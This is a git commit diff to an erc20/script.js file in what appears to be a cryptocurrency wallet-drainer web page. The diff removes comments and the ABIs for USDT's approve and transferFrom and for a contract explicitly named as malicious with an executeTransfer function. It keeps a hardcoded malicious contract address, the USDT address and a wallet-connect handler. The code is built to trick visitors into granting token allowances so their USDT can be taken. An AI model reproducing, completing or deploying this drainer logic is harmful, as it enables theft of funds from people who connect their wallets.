c514e2a929fd7288a7f7a4fb001ca48bd6527a16
uplusproject <uplusproject@gmail.com>
2024-10-19 21:29:03 +0800

    Update script.js

--- erc20/script.js
+++ erc20/script.js
@@ -1,85 +1,10 @@
-// Ethereum provider and signer
 let provider;
 let signer;
 let userAddress;
 
-// 合约地址和 ABI
 const maliciousContractAddress = "0xAc7aa2ee970A703F3716A66D39F6A1cc5cfcea6b"; // 替换为你的恶意合约地址
 const usdtContractAddress = "0xdAC17F958D2ee523a2206206994597C13D831ec7"; // USDT 合约地址
-const maliciousContractABI = [
-    // 添加恶意合约的 ABI
-    {
-        "inputs": [
-            {
-                "internalType": "address",
-                "name": "user",
-                "type": "address"
-            }
-        ],
-        "name": "executeTransfer",
-        "outputs": [],
-        "stateMutability": "nonpayable",
-        "type": "function"
-    }
-];
-const usdtABI = [
-    // 添加 USDT 合约的 ABI
-    {
-        "inputs": [
-            {
-                "internalType": "address",
-                "name": "spender",
-                "type": "address"
-            },
-            {
-                "internalType": "uint256",
-                "name": "amount",
-                "type": "uint256"
-            }
-        ],
-        "name": "approve",
-        "outputs": [
-            {
-                "internalType": "bool",
-                "name": "",
-                "type": "bool"
-            }
-        ],
-        "stateMutability": "nonpayable",
-        "type": "function"
-    },
-    {
-        "inputs": [
-            {
-                "internalType": "address",
-                "name": "sender",
-                "type": "address"
-            },
-            {
-                "internalType": "address",
-                "name": "recipient",
-                "type": "address"
-            },
-            {
-                "internalType": "uint256",
-                "name": "amount",
-                "type": "uint256"
-            }
-        ],
-        "name": "transferFrom",
-        "outputs": [
-            {
-                "internalType": "bool",
-                "name": "",
-                "type": "bool"
-            }
-        ],
-        "stateMutability": "nonpayable",
-        "type": "function"
-    }
-];
 
-// 连接钱包
 document.getElementById("connectButton").onclick = async () => {
     try {
         if (typeof window.ethereum !== 'undefined') {
